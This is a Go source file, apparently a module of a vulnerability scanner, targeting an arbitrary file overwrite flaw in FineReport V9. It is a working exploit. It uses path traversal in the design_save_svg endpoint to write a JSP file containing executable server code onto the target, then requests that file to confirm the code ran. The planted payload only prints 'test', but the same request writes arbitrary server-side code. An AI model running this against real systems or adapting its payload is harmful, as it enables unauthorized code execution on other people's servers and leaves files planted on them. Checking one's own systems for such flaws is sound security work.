package V9_design_save_svg

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	// 第一个 POST 请求
	firstPostUrl := url + "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/test123.svg.jsp"
	firstPostData := `{"__CONTENT__":"<%out.println(\"test\");%>","__CHARSET__":"UTF-8"}`
	firstResp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "text/xml; charset=UTF-8",
		}).
		SetBodyString(firstPostData).
		Post(firstPostUrl)

	if err == nil && firstResp.StatusCode == 200 {
		// 第二个 GET 请求
		secondGetUrl := url + "/WebReport/test123.svg.jsp"
		secondResp, err := client.R().
			SetHeaders(map[string]string{
				"User-Agent": UA,
			}).
			Get(secondGetUrl)

		if err == nil && secondResp.StatusCode == 200 {
			// 检查响应体是否包含 "test" 关键字
			return strings.Contains(secondResp.String(), "test")
		}
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+]帆软（FineReport) V9任意文件覆盖漏洞存在 -> ", url)
	} else {
		color.Red.Println("[-]帆软（FineReport) V9任意文件覆盖漏洞不存在")
	}
}
